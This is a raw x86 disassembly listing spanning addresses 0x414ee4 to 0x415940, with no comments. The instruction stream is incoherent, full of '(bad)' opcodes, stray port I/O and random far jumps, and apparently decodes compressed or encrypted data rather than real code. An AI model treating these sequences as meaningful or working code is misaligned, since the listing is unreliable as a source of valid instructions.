  414ee4:	sub    ebp,DWORD PTR [ecx+0x43260f99]
  414eea:	jecxz  0x414ee6
  414eec:	icebp  
  414eed:	or     al,0x52
  414eef:	cmp    eax,0x435cc583
  414ef4:	jmp    0x890f:0xd23f2599
  414efb:	pop    ds
  414efc:	das    
  414efd:	in     eax,dx
  414efe:	lock and esp,0x43
  414f02:	arpl   WORD PTR [ebx-0x6c],ax
  414f05:	sub    eax,0x9a5b3e6a
  414f0a:	add    eax,0x905611f4
  414f0f:	outs   dx,BYTE PTR ds:[esi]
  414f10:	xchg   BYTE PTR [eax],al
	...
  414f72:	add    BYTE PTR [eax],al
  414f74:	aaa    
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd13:0x7b815986
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    eax,0x2c000001
  414f8d:	mov    DWORD PTR [ebx],edi
  414f8f:	dec    esp
  414f90:	mov    al,0x9e
  414f92:	inc    ebx
  414f93:	stos   DWORD PTR es:[edi],eax
  414f94:	mov    ebx,0xf6adeb27
  414f99:	xlat   BYTE PTR ds:[ebx]
  414f9a:	jns    0x415017
  414f9c:	mov    ecx,0x87f4cb57
  414fa1:	push   esi
  414fa2:	fsubp  st(7),st
  414fa4:	leave  
  414fa5:	loope  0x414fd3
  414fa7:	xor    al,0x68
  414fa9:	nop
  414faa:	loopne 0x41501f
  414fac:	sar    BYTE PTR [eax-0x63e1ed01],cl
  414fb2:	push   0xad2aeb9e
  414fb7:	push   ds
  414fb8:	out    dx,eax
  414fb9:	cmp    BYTE PTR [ebp-0x36dc39ec],al
  414fbf:	push   ebp
  414fc0:	out    dx,al
  414fc1:	scas   eax,DWORD PTR es:[edi]
  414fc2:	call   0x746e:0x127e081
  414fc9:	inc    eax
  414fca:	push   ebp
  414fcb:	push   esi
  414fcc:	bound  eax,QWORD PTR [ebp-0x1a]
  414fcf:	add    ebp,DWORD PTR [esi-0x43736573]
  414fd5:	mov    al,0x62
  414fd7:	gs iret 
  414fd9:	push   es
  414fda:	fidivr DWORD PTR gs:[edi-0x68]
  414fde:	pop    es
  414fdf:	test   DWORD PTR [eax-0x3e],esp
  414fe2:	mov    al,0xa
  414fe4:	push   esi
  414fe5:	repnz dec ebp
  414fe7:	call   DWORD PTR [edi+0xa2bd9e3]
  414fed:	lds    esp,FWORD PTR [eax]
  414fef:	ja     0x414fab
  414ff1:	or     DWORD PTR [esi-0x77],0x26
  414ff5:	push   cs
  414ff6:	dec    ebp
  414ff7:	jmp    0xb266:0x13a287bc
  414ffe:	push   ebp
  414fff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415000:	pop    ebx
  415001:	sub    al,0xc6
  415003:	lock ins BYTE PTR es:[edi],dx
  415005:	push   edi
  415006:	fs inc edx
  415008:	dec    esp
  415009:	cwde   
  41500a:	rol    BYTE PTR [ebx+0x11],0x5a
  41500e:	sub    BYTE PTR [ecx-0x44a3feb9],bl
  415014:	nop
  415015:	(bad)  
  415017:	and    DWORD PTR [eax+ebp*8],esp
  41501a:	pop    ds
  41501b:	mov    al,0xed
  41501e:	add    BYTE PTR [ebx-0x46836efd],ah
  415024:	fmul   QWORD PTR [edx+ecx*4-0x7a88df5b]
  41502b:	xchg   ebp,eax
  41502c:	data16 xor BYTE PTR [esi],ah
  41502f:	(bad)  [ecx-0x774f599e]
  415035:	sbb    BYTE PTR [ebx],ah
  415037:	push   edi
  415038:	sbb    eax,0x83805c4c
  41503d:	popa   
  41503e:	xchg   BYTE PTR [ebx],ah
  415040:	add    WORD PTR [edx],bp
  415043:	daa    
  415044:	repz cmp BYTE PTR [esi+0x62],bl
  415048:	xor    al,0x53
  41504a:	in     al,0x7d
  41504c:	inc    esi
  41504d:	call   0xe02f:0xdb3c2fe1
  415054:	cmp    ecx,DWORD PTR [esi+edi*1+0x43]
  415058:	adc    BYTE PTR [eax-0x20a503db],bl
  41505e:	and    ebp,DWORD PTR [esi]
  415060:	dec    esi
  415061:	mov    DWORD PTR [edx+0x4fa43d11],ecx
  415067:	adc    DWORD PTR [edx-0xa3b13f5],ebx
  41506d:	int3   
  41506e:	dec    esi
  41506f:	push   eax
  415070:	test   al,0xf6
  415072:	ret    
  415073:	mov    eax,ds:0xfdace0fa
  415078:	aas    
  415079:	stc    
  41507a:	mov    cl,0x93
  41507c:	stos   BYTE PTR es:[edi],al
  41507d:	data16 std 
  41507f:	(bad)  [eax-0x66]
  415082:	and    DWORD PTR [edi],esp
  415084:	nop
  415085:	lahf   
  415086:	dec    ebp
  415087:	jb     0x415039
  415089:	sub    al,0xcc
  41508b:	jb     0x4150a8
  41508d:	mov    al,ds:0x911b95
	...
  4150f2:	add    BYTE PTR [eax],al
  4150f4:	jnp    0x4150f8
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0x5ab1fc2d
  415102:	inc    ebx
  415103:	scas   al,BYTE PTR es:[edi]
  415104:	sbb    dh,bl
  415106:	add    BYTE PTR [eax],al
  415108:	add    eax,0x38000001
  41510d:	push   0x6fbcdeaa
  415112:	ret    0xe20
  415115:	and    bh,BYTE PTR [ebp+0xd]
  415118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415119:	hlt    
  41511a:	inc    eax
  41511b:	cmp    al,0x81
  41511d:	stos   DWORD PTR es:[edi],eax
  41511e:	fwait
  41511f:	lods   eax,DWORD PTR ds:[esi]
  415120:	fdivr  st,st(2)
  415122:	shl    BYTE PTR [ebp+0x1da6d2e6],0xe2
  415129:	cmp    bh,al
  41512b:	inc    esi
  41512c:	(bad)  
  41512d:	jae    0x4150ce
  41512f:	xor    ebp,DWORD PTR [edi+0xcb0cec1]
  415135:	and    eax,0xf0e9f51c
  41513a:	mov    bh,0x92
  41513c:	out    dx,eax
  41513d:	inc    esi
  41513e:	outs   dx,DWORD PTR ds:[esi]
  41513f:	stc    
  415140:	lea    ecx,[eax+0x53]
  415143:	mov    dh,0xdc
  415145:	shl    DWORD PTR [ebp+0x38e41418],cl
  41514b:	xchg   esi,eax
  41514c:	jmp    0x41516f
  41514e:	rol    eax,cl
  415150:	out    0xcc,al
  415152:	int3   
  415153:	mov    bl,0x96
  415155:	mov    dl,0x4d
  415157:	das    
  415158:	push   cs
  415159:	stc    
  41515a:	push   cs
  41515b:	(bad)  
  41515c:	aaa    
  41515d:	test   eax,0x40fa7df0
  415162:	out    dx,eax
  415163:	xlat   BYTE PTR ds:[ebx]
  415164:	push   ebx
  415165:	(bad)  
  415166:	inc    edi
  415167:	sub    DWORD PTR [eax+0x18],eax
  41516a:	mov    edx,0xc0387d7c
  41516f:	mov    ah,0xc
  415171:	xchg   edx,eax
  415172:	cmp    BYTE PTR [edx+0x510dee82],cl
  415178:	retf   
  415179:	cmp    DWORD PTR [esi-0x4f],0xffffff9c
  41517d:	add    edx,DWORD PTR [ebx-0x64]
  415180:	stc    
  415181:	mov    bl,0xf6
  415183:	test   eax,0x6bc91520
  415188:	(bad)  
  415189:	mov    dl,0xd3
  41518b:	push   ebp
  41518c:	test   eax,0xf533bbcb
  415191:	jnp    0x4151be
  415193:	mov    bl,0xc2
  415195:	adc    esi,eax
  415197:	push   0x58e9335d
  41519c:	stos   BYTE PTR es:[edi],al
  41519d:	fistp  QWORD PTR [ebx+eiz*8-0x1dc6e99c]
  4151a4:	popf   
  4151a5:	inc    ebx
  4151a6:	(bad)  
  4151a8:	bound  esp,QWORD PTR [ebx+esi*4-0x309d1678]
  4151af:	and    dl,BYTE PTR [edx-0x4241b26d]
  4151b5:	std    
  4151b6:	mov    al,0x2f
  4151b8:	clc    
  4151b9:	lods   al,BYTE PTR ds:[esi]
  4151ba:	lahf   
  4151bb:	ins    BYTE PTR es:[edi],dx
  4151bc:	push   esp
  4151bd:	retf   0x9005
  4151c0:	out    dx,eax
  4151c1:	lods   al,BYTE PTR ds:[esi]
  4151c2:	sub    ebp,DWORD PTR [esi-0x104ee2c5]
  4151c8:	out    0x53,eax
  4151ca:	(bad)  
  4151cb:	mov    ebp,0xcc084805
  4151d0:	mov    edi,0x3bd4e573
  4151d5:	mov    edx,0x31347ec2
  4151da:	sub    BYTE PTR [ecx],al
  4151dc:	pop    ebx
  4151dd:	outs   dx,BYTE PTR ds:[esi]
  4151de:	inc    esp
  4151df:	pop    edi
  4151e0:	pop    ecx
  4151e1:	bnd jbe 0x4151c8
  4151e4:	lahf   
  4151e5:	xchg   edi,eax
  4151e6:	(bad)  
  4151e8:	xchg   ebx,eax
  4151e9:	ins    DWORD PTR es:[edi],dx
  4151ea:	sub    eax,0xfd74dd2d
  4151ef:	mov    ebp,0x5f6f8f14
  4151f4:	mov    bl,0xfe
  4151f6:	lods   al,BYTE PTR ds:[esi]
  4151f7:	(bad)  
  4151f8:	mov    DWORD PTR [ebx+0x56],0x3ca33726
  4151ff:	push   es
  415200:	jge    0x415205
  415202:	mov    al,ds:0xcb9c2257
  415207:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415208:	ucomiss xmm3,DWORD PTR [edi-0xc]
  41520c:	aam    0x4e
  41520e:	cwde   
  41520f:	push   ebx
  415210:	stc    
	...
  415271:	add    BYTE PTR [eax],al
  415273:	add    BYTE PTR [edi+edx*4],ch
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0x2a2960b
  415283:	add    bl,BYTE PTR ds:0x50000df
  415289:	add    DWORD PTR [eax],eax
  41528b:	add    ch,ch
  41528d:	mov    al,ds:0xc9cb6c17
  415292:	jge    0x4152cb
  415294:	scas   eax,DWORD PTR es:[edi]
  415295:	dec    ebx
  415296:	mov    ecx,ds
  415298:	cmp    BYTE PTR [edx],al
  41529a:	fs adc al,0xd2
  41529d:	xor    DWORD PTR [ebx+0x4c],eax
  4152a0:	add    edx,DWORD PTR [ebx+0x56]
  4152a3:	or     DWORD PTR [ebx],0x152947b2
  4152a9:	pop    edx
  4152aa:	pop    ds
  4152ab:	call   0xf0b1b441
  4152b0:	imul   ebx,edx,0x76f968cf
  4152b6:	sbb    DWORD PTR [edi+0x45],edx
  4152b9:	sbb    edi,DWORD PTR [edx+ecx*2-0x336d8b68]
  4152c0:	je     0x4152b0
  4152c2:	push   edi
  4152c3:	fwait
  4152c4:	inc    esi
  4152c5:	adc    BYTE PTR [eax],0x1c
  4152c8:	retf   0x817f
  4152cb:	(bad)  
  4152cc:	repz inc esp
  4152ce:	mov    eax,ds:0xb47393d8
  4152d3:	inc    edi
  4152d4:	sar    BYTE PTR [eax],0xa9
  4152d7:	and    eax,0x429341c0
  4152dc:	stos   DWORD PTR es:[edi],eax
  4152dd:	pushf  
  4152de:	mov    BYTE PTR [esp+ecx*8],dl
  4152e1:	mov    WORD PTR [esi-0x4705b7e9],ds
  4152e7:	push   edi
  4152e8:	cld    
  4152e9:	xchg   edi,eax
  4152ea:	xor    ah,al
  4152ec:	add    DWORD PTR [ecx+0xbc83d78],esi
  4152f2:	adc    BYTE PTR [ecx],cl
  4152f4:	push   ss
  4152f5:	mov    DWORD PTR [ebx+0x74],ebx
  4152f8:	cs push ebx
  4152fa:	push   ss
  4152fb:	js     0x415337
  4152fd:	int3   
  4152fe:	add    edx,DWORD PTR [edi+ebx*8+0x1865601d]
  415305:	popf   
  415306:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415307:	add    al,0xe2
  415309:	mov    edx,gs
  41530b:	mov    eax,ds:0xa7045386
  415310:	sub    al,0xb7
  415312:	outs   dx,BYTE PTR ds:[esi]
  415313:	push   cs
  415314:	xlat   BYTE PTR ds:[ebx]
  415315:	mov    cl,0x98
  415317:	adc    eax,0x9eb06f27
  41531c:	jbe    0x415382
  41531e:	jle    0x415379
  415320:	jg     0x415329
  415322:	jns    0x415395
  415324:	aad    0xd0
  415326:	mov    ah,BYTE PTR [ebp-0x1f]
  415329:	aaa    
  41532a:	push   cs
  41532b:	(bad)  
  41532d:	ins    BYTE PTR es:[edi],dx
  41532e:	ret    
  41532f:	aam    0x34
  415331:	mov    ebx,0xf284768c
  415336:	xchg   esp,eax
  415337:	rcr    DWORD PTR [ecx+0x76a97063],cl
  41533d:	push   ebx
  41533e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41533f:	mov    ah,dl
  415341:	(bad)  
  415342:	fimul  DWORD PTR [eax-0x35]
  415345:	retf   
  415346:	ja     0x415396
  415348:	or     BYTE PTR [eax+0x4788f95e],dh
  41534e:	inc    edx
  41534f:	lock loope 0x4152eb
  415352:	jmp    0xfb17:0xb853708a
  415359:	mov    ds:0x392bef36,al
  41535e:	ror    BYTE PTR [ebx+edx*8-0x65],1
  415362:	mov    bh,0xd1
  415364:	mov    dh,0x43
  415366:	inc    ecx
  415367:	fld    QWORD PTR [esi+0x2db21c1]
  41536d:	jl     0x4153b6
  41536f:	out    dx,eax
  415370:	js     0x4152f8
  415372:	aam    0x2a
  415374:	dec    ecx
  415375:	(bad)  
  415376:	cwde   
  415377:	test   DWORD PTR [eax+0x5b270a01],esp
  41537d:	sbb    al,0xd8
  41537f:	mov    ah,0x67
  415381:	mov    ebp,0xa6ed266f
  415386:	add    al,0xcb
  415388:	out    dx,eax
  415389:	push   0xffffffd8
  41538b:	addr16 pop ebp
  41538d:	cmp    bl,ah
  41538f:	in     al,0xdc
	...
  4153f1:	add    BYTE PTR [eax],al
  4153f3:	add    BYTE PTR [ebp-0x10],ch
  4153f6:	repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0xe5d3e5b0
  415401:	cmp    al,0xb6
  415403:	mov    dl,0x22
  415405:	loopne 0x415407
  415407:	add    BYTE PTR ds:0xea000001,al
  41540d:	pop    eax
  41540e:	test   ebp,esp
  415410:	mov    WORD PTR [edx],fs
  415412:	shl    edi,0x47
  415415:	jmp    0x4153c4
  415417:	lods   al,BYTE PTR ds:[esi]
  415418:	mov    DWORD PTR [ebx+edx*1+0x5c1a4583],edx
  41541f:	outs   dx,DWORD PTR ds:[esi]
  415420:	jbe    0x4153fe
  415422:	(bad)  
  415423:	fiadd  WORD PTR [edi-0x5a55acb9]
  415429:	inc    dx
  41542b:	test   BYTE PTR [ebp+0x7b],bl
  41542e:	add    eax,0xe9839772
  415433:	mov    ch,0x7e
  415435:	mov    esi,0x7db4534e
  41543a:	ror    DWORD PTR [eax],1
  41543c:	jecxz  0x41548a
  41543e:	xchg   esp,eax
  41543f:	div    DWORD PTR [ebx]
  415441:	xor    dl,dh
  415443:	pusha  
  415444:	test   BYTE PTR [edi+0x5cab0281],dl
  41544a:	mov    eax,0x1c569c25
  41544f:	xchg   ebp,eax
  415450:	and    al,0x62
  415452:	jns    0x41544f
  415454:	in     eax,0x98
  415456:	imul   ebp,ebx,0x5fe7ed40
  41545c:	nop
  41545d:	repz xchg edx,eax
  41545f:	dec    ebp
  415460:	xchg   esp,eax
  415461:	fwait
  415462:	push   esp
  415463:	mov    eax,ds:0x2be88f25
  415468:	xor    edx,DWORD PTR [edx-0xbaeb3c1]
  41546e:	inc    edx
  41546f:	mul    BYTE PTR [edi]
  415471:	and    edx,ebp
  415473:	fcmovnbe st,st(7)
  415475:	jae    0x4154f0
  415477:	add    al,0x85
  415479:	iret   
  41547a:	adc    BYTE PTR [esi],0x11
  41547d:	xchg   esp,eax
  41547e:	retf   0xd15f
  415481:	or     eax,0x33eb802b
  415486:	jmp    0x60ab9d47
  41548b:	xchg   edi,eax
  41548c:	outs   dx,BYTE PTR ds:[esi]
  41548d:	or     al,0xfa
  41548f:	aas    
  415490:	aad    0x4c
  415492:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415493:	ja     0x4154bb
  415495:	adc    esi,ecx
  415497:	rol    dh,1
  415499:	push   0x23
  41549b:	pop    esp
  41549c:	(bad)  
  41549d:	repnz mov eax,0x69b3cf1e
  4154a3:	sub    edx,ebx
  4154a5:	mov    al,0x7c
  4154a7:	test   al,0x47
  4154a9:	and    BYTE PTR [esi+0x15],0x2d
  4154ad:	xlat   BYTE PTR ds:[ebx]
  4154ae:	mov    dh,0x30
  4154b0:	mov    DWORD PTR [esi+0x180d388b],eax
  4154b6:	retf   0xd9ef
  4154b9:	push   cs
  4154ba:	pop    ds
  4154bb:	cld    
  4154bc:	retf   0xb1c5
  4154bf:	mov    cl,0x16
  4154c1:	mov    ah,0x6
  4154c3:	(bad)  
  4154c4:	fild   WORD PTR [ebx+0x6f]
  4154c7:	mov    al,0xa9
  4154c9:	daa    
  4154ca:	push   cs
  4154cb:	mov    bh,0x24
  4154cd:	jl     0x4154e4
  4154cf:	dec    ebp
  4154d0:	retf   
  4154d1:	and    BYTE PTR [edx],cl
  4154d3:	imul   ebx,edx,0xffffff8b
  4154d6:	fidiv  WORD PTR [edx]
  4154d8:	in     eax,0x64
  4154da:	gs add eax,0x6e2b5f78
  4154e0:	test   eax,0xf069ebb3
  4154e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154e6:	fidivr WORD PTR [edx+0x2e]
  4154e9:	lock mov ch,0xca
  4154ec:	inc    edi
  4154ed:	in     eax,0x2d
  4154ef:	ret    0x38e6
  4154f2:	or     BYTE PTR [edx+ecx*1-0x675815ad],ch
  4154f9:	ror    ebp,1
  4154fb:	(bad)  
  4154fc:	cmp    BYTE PTR [esi-0x55],bh
  4154ff:	ficom  WORD PTR [esi]
  415501:	jecxz  0x415513
  415503:	adc    BYTE PTR [ebp-0x79],0x2e
  415507:	add    BYTE PTR [edi+0x1046b12f],bl
  41550d:	xchg   esi,eax
  41550e:	ds mov edx,0x9
	...
  415574:	in     al,0xf0
  415576:	sub    DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x4155e2
  415581:	frstor [edi+0xe12756]
  415587:	add    BYTE PTR ds:0x69000001,al
  41558d:	daa    
  41558e:	push   0x772389fc
  415593:	push   es
  415594:	jle    0x4155d3
  415596:	(bad)  
  415597:	and    al,0x9b
  415599:	(bad)  
  41559a:	lahf   
  41559b:	mov    eax,DWORD PTR [ebp-0x1d8fdeb7]
  4155a1:	and    bh,BYTE PTR [ecx+0xd]
  4155a4:	sub    ah,BYTE PTR [ebp+0x34]
  4155a7:	pop    esp
  4155a8:	mov    dh,0x8c
  4155aa:	inc    esp
  4155ab:	jmp    0xd073:0xa72e0a35
  4155b2:	neg    DWORD PTR [edi+0x6a]
  4155b5:	iret   
  4155b6:	jle    0x415636
  4155b8:	pushf  
  4155b9:	lea    edi,[edi-0x37]
  4155bc:	inc    esi
  4155bd:	into   
  4155be:	cmc    
  4155bf:	mov    fs,WORD PTR [eax+0x3e]
  4155c2:	lock test BYTE PTR [edx+0x2d],bl
  4155c6:	sbb    BYTE PTR [edi+0x3c],ah
  4155c9:	stos   DWORD PTR es:[edi],eax
  4155ca:	test   BYTE PTR [ebx+0x7d901ae0],ch
  4155d0:	outs   dx,BYTE PTR ds:[esi]
  4155d1:	add    BYTE PTR [ebp-0x18],al
  4155d4:	lock xchg ebx,eax
  4155d6:	aam    0xf3
  4155d8:	stc    
  4155d9:	test   eax,0x8f409e5c
  4155de:	mov    bl,0x34
  4155e0:	cmp    eax,0x4c360622
  4155e5:	icebp  
  4155e6:	jns    0x415646
  4155e8:	loope  0x415577
  4155ea:	gs scas eax,DWORD PTR es:[edi]
  4155ec:	sbb    ebx,ebp
  4155ee:	ins    DWORD PTR es:[edi],dx
  4155ef:	lahf   
  4155f0:	add    bl,cl
  4155f2:	adc    DWORD PTR [ecx],ecx
  4155f4:	add    al,0xc0
  4155f6:	add    cl,BYTE PTR [ecx+0x4f11b973]
  4155fc:	adc    DWORD PTR [edi],esi
  4155fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155ff:	mov    WORD PTR [eax],gs
  415601:	and    DWORD PTR [edx],ecx
  415603:	mov    ah,0x8b
  415605:	out    dx,eax
  415606:	pop    ds
  415607:	jne    0x415648
  415609:	xchg   ecx,eax
  41560a:	loopne 0x41562c
  41560c:	(bad)  
  41560d:	pop    ds
  41560e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41560f:	(bad)
  415613:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415614:	(bad)  
  415615:	sub    DWORD PTR fs:[ecx+0x67acbc2f],ecx
  41561c:	push   es
  41561d:	retf   0x4a14
  415620:	inc    ebx
  415621:	dec    edi
  415622:	or     ch,dh
  415624:	push   ss
  415625:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415626:	addr16 mov cl,0x2f
  415629:	and    edx,DWORD PTR [esi-0x3c0a9490]
  41562f:	push   ss
  415630:	xchg   esp,eax
  415631:	pop    esi
  415632:	xlat   BYTE PTR ds:[ebx]
  415634:	rol    DWORD PTR [ecx+esi*4],1
  415637:	mov    esi,DWORD PTR [ebp+0x33bd76c2]
  41563d:	add    ebp,DWORD PTR [edi+0x1909970c]
  415643:	prefetchw BYTE PTR [eax]
  415646:	mov    ch,0xaa
  415648:	push   esi
  415649:	loopne 0x4155e4
  41564b:	outs   dx,DWORD PTR ds:[esi]
  41564c:	adc    BYTE PTR ds:0x47597b82,cl
  415652:	dec    edi
  415653:	test   eax,0x9bcab1bd
  415658:	iret   
  415659:	sbb    DWORD PTR [esi],ebp
  41565b:	xchg   esi,eax
  41565c:	call   0xc570:0xb27cba58
  415663:	(bad)  [ebx]
  415665:	or     al,0xe1
  415667:	add    eax,0x7e5ead8d
  41566c:	sub    ch,BYTE PTR [eax-0x75bc3b69]
  415672:	imul   ebp,DWORD PTR [edi],0xef99960e
  415678:	pop    ebx
  415679:	scas   eax,DWORD PTR es:[edi]
  41567a:	jmp    0x3686:0x2ae91ba9
  415681:	loope  0x41569e
  415683:	cmp    BYTE PTR [ebx],dh
  415685:	call   0x2a11:0xad86658f
  41568c:	sub    esp,DWORD PTR [edi-0x7a]
  41568f:	(bad)  
  415690:	in     eax,0x0
	...
  4156f2:	add    BYTE PTR [eax],al
  4156f4:	ins    DWORD PTR es:[edi],dx
  4156f5:	call   0xbafd:0x67ff45bc
  4156fc:	mov    bl,0xba
  4156fe:	inc    esi
  4156ff:	sub    al,0x4a
  415701:	push   esi
  415702:	and    al,0x2f
  415704:	sub    al,0xe2
  415706:	add    BYTE PTR [eax],al
  415708:	add    eax,0x3e000001
  41570d:	mov    bh,0x5a
  41570f:	adc    DWORD PTR [esi],edi
  415711:	sub    al,0x37
  415713:	cli    
  415714:	pop    ebx
  415715:	lahf   
  415716:	jae    0x415715
  415718:	xchg   ecx,eax
  415719:	mov    ah,0xc2
  41571b:	lahf   
  41571c:	pop    eax
  41571d:	imul   eax,DWORD PTR [ebp+0x32],0xffffffb5
  415721:	xchg   edi,eax
  415722:	xchg   DWORD PTR ss:0x73927a9d,edx
  415729:	push   ds
  41572a:	add    al,0xdd
  41572c:	mov    eax,ds:0xa27b9395
  415731:	and    ah,bh
  415733:	push   esi
  415734:	or     BYTE PTR [esi],ch
  415736:	inc    ebx
  415737:	mov    ebp,0x6a1f7f3a
  41573c:	je     0x4156e6
  41573e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41573f:	push   esp
  415740:	outs   dx,DWORD PTR ds:[esi]
  415741:	arpl   si,bx
  415743:	adc    DWORD PTR [ebx+0x28],ebp
  415746:	lahf   
  415747:	out    0xa3,al
  415749:	cs adc eax,0xf41ea36c
  41574f:	pop    ds
  415750:	gs iret 
  415752:	bound  edx,QWORD PTR [edi]
  415754:	adc    ebp,DWORD PTR [ebx-0x3]
  415757:	mov    esi,0x4c411c9e
  41575c:	or     al,BYTE PTR [ecx+eax*1]
  41575f:	sub    ch,BYTE PTR [esi+0x7f52a301]
  415765:	imul   edx,ebx,0x9c86b9d4
  41576b:	cmp    al,0xd2
  41576d:	xchg   ecx,eax
  41576e:	inc    edx
  41576f:	ja     0x41571c
  415771:	push   cs
  415772:	jae    0x415712
  415774:	or     dl,bl
  415776:	das    
  415777:	mul    BYTE PTR [edi-0x47882c7c]
  41577d:	and    BYTE PTR [esi+0x38a91c5f],cl
  415783:	loopne 0x41571f
  415785:	mov    eax,0x77aa742
  41578a:	dec    eax
  41578b:	jnp    0x415780
  41578d:	sub    esp,DWORD PTR [ecx]
  41578f:	cs mov bl,0x91
  415792:	sbb    esp,DWORD PTR [edi]
  415794:	imul   edx,ecx,0x2d365f00
  41579a:	or     DWORD PTR [edx],ecx
  41579c:	pop    ecx
  41579d:	(bad)
  4157a1:	sub    al,0x51
  4157a3:	cmc    
  4157a4:	dec    eax
  4157a5:	mov    edx,0x71eed495
  4157aa:	lds    ebp,FWORD PTR [esp+eax*2+0x74]
  4157ae:	stc    
  4157af:	loopne 0x415760
  4157b1:	jl     0x415818
  4157b3:	lahf   
  4157b4:	mov    edi,0xba4cfda
  4157b9:	lahf   
  4157ba:	cwde   
  4157bb:	jmp    DWORD PTR [esi-0x71]
  4157be:	(bad)  
  4157bf:	mov    dh,0xe3
  4157c1:	cmp    esi,DWORD PTR [edx+0x76]
  4157c4:	push   ecx
  4157c5:	mov    esp,0x8d66a2f2
  4157ca:	sub    al,0x93
  4157cc:	jmp    0x415751
  4157ce:	aas    
  4157cf:	push   esi
  4157d0:	push   DWORD PTR [edi-0x6c]
  4157d3:	xchg   ecx,eax
  4157d4:	mov    al,ds:0x5dbf8fc4
  4157d9:	and    al,0xb0
  4157db:	push   ebx
  4157dc:	jecxz  0x415809
  4157de:	icebp  
  4157df:	pop    ebp
  4157e0:	xchg   ebp,eax
  4157e1:	mov    al,0xf7
  4157e3:	cmp    bl,cl
  4157e5:	adc    cl,BYTE PTR [edx]
  4157e7:	push   edx
  4157e8:	mov    dh,0x91
  4157ea:	pop    ecx
  4157eb:	dec    ebx
  4157ec:	cmc    
  4157ed:	cwde   
  4157ee:	dec    esp
  4157ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157f0:	int3   
  4157f1:	mov    al,0x82
  4157f3:	daa    
  4157f4:	xor    al,0x5a
  4157f6:	inc    esi
  4157f7:	jge    0x415867
  4157f9:	fsubr  DWORD PTR [esi]
  4157fc:	adc    al,0x94
  4157fe:	pop    esi
  4157ff:	js     0x4157e8
  415801:	test   eax,0xe30779cd
  415806:	sar    BYTE PTR [ebp*1-0x1c89a797],cl
  41580d:	xchg   DWORD PTR [ebp+0x7c],eax
  415810:	lods   al,BYTE PTR ds:[esi]
	...
  415871:	add    BYTE PTR [eax],al
  415873:	add    bl,cl
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	rcr    ebx,cl
  415881:	cld    
  415882:	xlat   BYTE PTR ds:[ebx]
  415883:	call   0x423bb9
  415888:	add    eax,0x7e000001
  41588d:	ret    0x1ad9
  415890:	and    al,0x6f
  415892:	sbb    al,0x87
  415894:	lea    ebp,[edi]
  415896:	push   ds
  415897:	cmp    bl,0x41
  41589a:	sti    
  41589b:	dec    edi
  41589c:	dec    ebp
  41589d:	push   esp
  41589e:	mov    ebx,0xf46c2a64
  4158a3:	cld    
  4158a4:	xchg   edx,eax
  4158a5:	add    BYTE PTR [ecx+0x2f22ca51],ah
  4158ab:	jge    0x41592b
  4158ad:	ret    0x9d14
  4158b0:	(bad)  
  4158b1:	jbe    0x415835
  4158b3:	push   cs
  4158b4:	fnsave [edx]
  4158b6:	out    dx,al
  4158b7:	jno    0x4158ec
  4158b9:	push   ss
  4158ba:	adc    BYTE PTR [ebx-0x296869bb],0xbf
  4158c1:	js     0x4158b7
  4158c3:	test   eax,0xf1e7c759
  4158c8:	lds    ebp,FWORD PTR [edi+0x727384e0]
  4158ce:	aas    
  4158cf:	fsubr  st(7),st
  4158d1:	jmp    0xb4af:0xaf33dbb7
  4158d8:	stc    
  4158d9:	adc    DWORD PTR [edx],ebp
  4158db:	das    
  4158dc:	jo     0x415898
  4158de:	xchg   ebp,eax
  4158df:	push   0x893522f3
  4158e4:	popf   
  4158e5:	inc    DWORD PTR [ebx+0x2d]
  4158e8:	out    0x69,eax
  4158ea:	jl     0x415967
  4158ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158ed:	push   ecx
  4158ee:	shl    DWORD PTR [edi+0x5eb9d009],0x12
  4158f5:	mov    dh,0xcc
  4158f7:	xor    al,0x28
  4158f9:	adc    cl,BYTE PTR [esi+0x1c]
  4158fc:	sbb    DWORD PTR [eax+esi*1],ebx
  4158ff:	cli    
  415900:	dec    ebp
  415901:	es push eax
  415903:	xor    esp,DWORD PTR [edx]
  415905:	adc    ch,BYTE PTR [edi+0x51]
  415908:	retf   0x9e3f
  41590b:	mov    edx,0x8492193c
  415910:	div    DWORD PTR [eax+0x39b6157]
  415916:	dec    BYTE PTR [eax-0x23]
  415919:	inc    edi
  41591a:	out    0x45,al
  41591c:	dec    eax
  41591d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41591e:	sahf   
  41591f:	or     eax,0x54ecbe3b
  415924:	dec    eax
  415925:	nop
  415926:	cdq    
  415927:	push   0x39
  415929:	sbb    bl,dh
  41592b:	mov    al,0x5d
  41592d:	xchg   edx,eax
  41592e:	sub    dl,bl
  415930:	les    edx,FWORD PTR [ecx]
  415932:	aas    
  415933:	out    0xb,al
  415935:	ret    0x8ed2
  415938:	gs and eax,0x3bf65a11
  41593e:	int    0xa4
  415940:	dec    ebp
